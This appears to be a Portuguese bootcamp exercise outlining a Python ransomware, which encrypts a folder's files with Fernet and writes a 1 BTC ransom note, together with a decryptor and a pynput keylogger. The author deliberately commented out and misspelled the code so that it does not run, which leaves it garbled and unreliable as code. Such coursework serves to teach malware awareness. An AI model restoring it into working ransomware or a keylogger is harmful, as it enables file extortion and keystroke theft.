# Desafio Dio Santander atividade Ransoware e Keylogger (adaptado e alterado devido ao antivirus e para não rodar )

Ransoware

Criar arquivo usuários
Criar arquivo senhas

Criar arquivo Ransoware para criptografar:

#obter código de cryptography.fernet import Fernet
#import os

# Desafio Dio Santander atividade Ransoware

# gerar uma chave de criptografia

#gerar_chae():
#chave = Fernet.generate_key()
#with open("xxx", "xx") as chave_arquivo:
#chave_aruivo.write(chave)

#carregar a chave de salva

#carregar_chave():
#return pen("xxx", "xx").read()

#criptografar um arquivo

#criptrafar_arquivo(nome_arquivo, chave):
#f = ernet(chave)
#with open(nome_arquivo, "rb") as arquivo:
#dads = arquivo.read()
#dos_criptografados = f.encrypt(dados)
#with on(nome_arquivo, "wb") as arquivo:
#arquo.write(dados_criptografados)
        
# Encontrar todos os arquivos em um diretório e criptografá-los

#criptografar_dirorio(diretorio):
#lista_arquos = []
#for root, arquivos in os.lk(diretorio):
#for nome in arquis:
#caminho_arivo = os.pah.join(root, nome)
#if nome != "raware.xx" and not nome.enwith(".key"):
#lista_arquivos.and(caminho_arquo)
#return lista_auivos


# Mensagem de resgate

#criar_mensagem_resgate():
#with open("LA ISSO.txt", "w") as arquivo:
#arquivo.we("Seus arquivos foram criptografados! Para descriptografá-los, envie 1 BTC para o endereço XYZ e entre em contato com o autor do malware.")


# Execução do ransomware

#din():
#gerr_chave()
#cve = carregar_chave()
#arqvo = encontrar_arquivos("test_files")
#for arquivo in arquivos:
#cptografar_arquivo(arquivo, chave)
       
#criar_mensagem_resgate()
#prit("Ransomware executado com sucesso! Seus arquivos foram criptografados e a mensagem de resgate foi criada.")
    
#if __name__ == "__main__":
#main()        



Criar arquivo Descriptografar

Função descriptografar arquivo 

#importar biblioteca cryptography.fernet 
 

#carregar_chave():
#return open("che.key", "rb").read()

#descriptograr_arquivo(nome_arquivo, chave):
#f = Fert(chave)
#with en(nome_arquivo, "rb") as arquivo:
#dados_cripgrafados = arquivo.read()
#dados_desiptografados = f.decrypt(dados_criptografados)
#with on(nome_arquivo, "wb") as arquivo:
#arquo.write(dados_descriptografados)  
        
#ncotrar_arquivos(diretorio):
#lta_arquivos = []
#for root, arquivos in os.lk(diretorio):
#for nome in arquivos:
#caminho_arquo = os.ph.join(root, nome)
#if nome != "descriografar.py" and not nome.endswith(".key"):
#lista_arquos.aend(caminho_arquivo)
#return lta_arquivos

#main():
#chave = carregar_chave()
#arquivos = enctrar_arquivos("test_files")
#for arquivo in arquivos:
#descriptograr_arquivo(arquivo, chave)
#print("Arquivos descriptografados com sucesso!")
    
#if __name__ == "__main__":
#main()    



PARTE 2

Keylogger script para ficar rodando e capturar tecla

Criar folder Keylogger

instalar biblioteca do pynput


#arquivo Keylogger

IGNORAR=(
keyboar.key.shif,
keybod.kkey.shi r
entre outros que deverá IGNORAR

on press (kkey):
try (para teclas normais - letras, numeros e simbolos
with open (log.txt,a, enconding-utf-8 as f 
f.wite(keychar)
exceção: Atributte error: (colocar exceções como utf-9) todas as exceções que escolher
if k ==keyboar espaço
write("")

with keyb.liste(onpress=onpress) as listener

